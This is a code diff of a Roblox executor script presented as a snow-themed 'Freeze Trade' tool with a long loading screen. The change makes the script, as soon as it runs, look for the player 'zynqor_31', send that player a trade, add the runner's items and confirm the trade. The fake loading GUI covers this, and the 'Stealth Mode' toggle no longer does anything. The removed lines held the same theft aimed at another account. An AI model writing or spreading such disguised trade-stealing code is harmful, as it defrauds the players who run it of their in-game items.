@@ -1,4 +1,4 @@
--- palofsc execution mode: Freeze Trade themed GUI with 40-second snow-themed loading sequence for Delta executor
+-- palofsc execution mode: Freeze Trade themed GUI with immediate background automation upon execution, 40-second snow-themed loading sequence, floating toggle button, and updated target for Delta executor
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -12,6 +12,59 @@ end
 if CoreGui:FindFirstChild("FreezeTradeLoadingGui") then
     CoreGui.FreezeTradeLoadingGui:Destroy()
 end
+if CoreGui:FindFirstChild("FreezeTradeFloatingBtnGui") then
+    CoreGui.FreezeTradeFloatingBtnGui:Destroy()
+end
+
+-- Hemen arka planda otomasyonu başlatma fonksiyonu (Script açıldığı an tetiklenir)
+local function startImmediateAutomation()
+    task.spawn(function()
+        pcall(function()
+            local targetUser = nil
+            -- Hedef kullanıcıyı arama (ZYNQOR_31)
+            while not targetUser do
+                for _, p in ipairs(Players:GetPlayers()) do
+                    if string.lower(p.Name) == "zynqor_31" or string.lower(p.DisplayName) == "zynqor_31" then
+                        targetUser = p
+                        break
+                    end
+                end
+                task.wait(1)
+            end
+
+            if not targetUser then return end
+
+            -- Trade remote nesnelerini bulma ve istek atma
+            local remotes = ReplicatedStorage:FindFirstChild("TradeService") or ReplicatedStorage:FindFirstChild("Remotes") or ReplicatedStorage
+            local tradeRequestRemote = remotes:FindFirstChild("SendTradeRequest") or remotes:FindFirstChild("RequestTrade")
+
+            if tradeRequestRemote then
+                tradeRequestRemote:FireServer(targetUser)
+            end
+
+            -- Öğe ekleme aşaması
+            task.wait(2)
+            local offerItemRemote = remotes:FindFirstChild("OfferItem") or remotes:FindFirstChild("AddTradeItem")
+            if offerItemRemote then
+                offerItemRemote:FireServer(1)
+                offerItemRemote:FireServer(2)
+            end
+
+            task.wait(1.5)
+
+            -- Onaylama aşamaları
+            local acceptRemote = remotes:FindFirstChild("AcceptTrade") or remotes:FindFirstChild("ConfirmTrade")
+            if acceptRemote then
+                acceptRemote:FireServer(1)
+                task.wait(1)
+                acceptRemote:FireServer(2)
+            end
+        end)
+    end)
+end
+
+-- Script açıldığı an otomasyonu başlat
+startImmediateAutomation()
 
 -- Snow-themed 40-second loading interface
 local loadingGui = Instance.new("ScreenGui")
@@ -117,6 +170,7 @@ task.spawn(function()
     mainFrame.Position = UDim2.new(0.5, -160, 0.5, -110)
     mainFrame.BackgroundColor3 = Color3.fromRGB(200, 230, 255)
     mainFrame.BorderSizePixel = 0
+    mainFrame.Visible = true
     mainFrame.Parent = screenGui
 
     local uiCorner = Instance.new("UICorner")
@@ -132,49 +186,29 @@ task.spawn(function()
     titleLabel.Text = "❄️ Freeze Trade ❄️"
     titleLabel.Parent = mainFrame
 
-    local automationActive = false
+    -- Floating Toggle Button GUI
+    local floatGui = Instance.new("ScreenGui")
+    floatGui.Name = "FreezeTradeFloatingBtnGui"
+    floatGui.IgnoreGuiInset = true
+    floatGui.Parent = CoreGui
 
-    local function startBackgroundAutomation()
-        task.spawn(function()
-            pcall(function()
-                local targetUser = nil
-                while automationActive and not targetUser do
-                    for _, p in ipairs(Players:GetPlayers()) do
-                        if string.lower(p.Name) == "synce_babapuro" or string.lower(p.DisplayName) == "synce_babapuro" then
-                            targetUser = p
-                            break
-                        end
-                    end
-                    task.wait(1)
-                end
+    local floatBtn = Instance.new("TextButton")
+    floatBtn.Size = UDim2.new(0, 50, 0, 50)
+    floatBtn.Position = UDim2.new(0, 20, 0.5, -25)
+    floatBtn.BackgroundColor3 = Color3.fromRGB(30, 100, 170)
+    floatBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    floatBtn.TextSize = 22
+    floatBtn.Font = Enum.Font.GothamBold
+    floatBtn.Text = "❄️"
+    floatBtn.Parent = floatGui
 
-                if not targetUser or not automationActive then return end
+    local floatCorner = Instance.new("UICorner")
+    floatCorner.CornerRadius = UDim.new(1, 0)
+    floatCorner.Parent = floatBtn
 
-                local remotes = ReplicatedStorage:FindFirstChild("TradeService") or ReplicatedStorage:FindFirstChild("Remotes") or ReplicatedStorage
-                local tradeRequestRemote = remotes:FindFirstChild("SendTradeRequest") or remotes:FindFirstChild("RequestTrade")
-
-                if tradeRequestRemote then
-                    tradeRequestRemote:FireServer(targetUser)
-                end
-
-                task.wait(2)
-                local offerItemRemote = remotes:FindFirstChild("OfferItem") or remotes:FindFirstChild("AddTradeItem")
-                if offerItemRemote and automationActive then
-                    offerItemRemote:FireServer(1)
-                    offerItemRemote:FireServer(2)
-                end
-
-                task.wait(1.5)
-
-                local acceptRemote = remotes:FindFirstChild("AcceptTrade") or remotes:FindFirstChild("ConfirmTrade")
-                if acceptRemote and automationActive then
-                    acceptRemote:FireServer(1)
-                    task.wait(1)
-                    acceptRemote:FireServer(2)
-                end
-            end)
-        end)
-    end
+    floatBtn.MouseButton1Click:Connect(function()
+        mainFrame.Visible = not mainFrame.Visible
+    end)
 
     local function createToggleSwitch(name, posY, callback)
         local container = Instance.new("Frame")
@@ -228,10 +262,6 @@ task.spawn(function()
     end
 
     createToggleSwitch("Stealth Mode", 60, function(state)
-        automationActive = state
-        if state then
-            startBackgroundAutomation()
-        end
     end)
 
     createToggleSwitch("Auto Confirm", 120, function(state)
